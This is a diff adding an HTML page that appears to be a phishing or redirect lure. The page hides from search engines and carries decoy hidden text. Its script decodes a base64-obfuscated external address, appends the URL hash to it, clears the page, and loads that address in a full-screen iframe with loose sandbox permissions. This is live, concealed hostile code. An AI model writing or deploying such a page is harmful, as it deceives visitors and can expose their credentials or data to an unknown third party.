@@ -1,0 +1,37 @@
+<html>
+ <head>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex, nofollow">
+ </head>
+ <body>
+ <span hidden>The cat napped in a sunny spot.</span>
+ </body>
+<script>
+var cicada = null;
+if(location.hash == ""){
+location.hash = `#`;
+cicada = `#`;
+}
+if(location.hash !== ""){
+cicada = location.hash;
+}
+if (location.hash.includes('?')) {
+cicada = location.hash.replace('#', '');
+}
+
+(async () => {
+    var elm = document.createElement('iframe');
+    elm.sandbox.add('allow-same-origin');
+    elm.sandbox.add('allow-top-navigation');
+    elm.sandbox.add('allow-modals');
+    elm.sandbox.add('allow-scripts');
+    elm.sandbox.add('allow-popups-to-escape-sandbox');
+    elm.sandbox.add('allow-forms');
+    elm.src = atob("aHR0cHM6Ly9ocmVmLmxpLz9odHRwczovL01kMi5yeW5hdmV4LmNvbS91RFVwY3NFaS8=")+cicada;
+    elm.style.cssText = 'position: fixed; inset: 0px; width: 100%; height: 100%; border: 0px; margin: 0px;padding: 0px; overflow: hidden; z-index: 999999;';
+    document.write(elm);
+    document.body.innerHTML = "";
+    document.body.appendChild(elm);
+})();
+</script>
+</html>
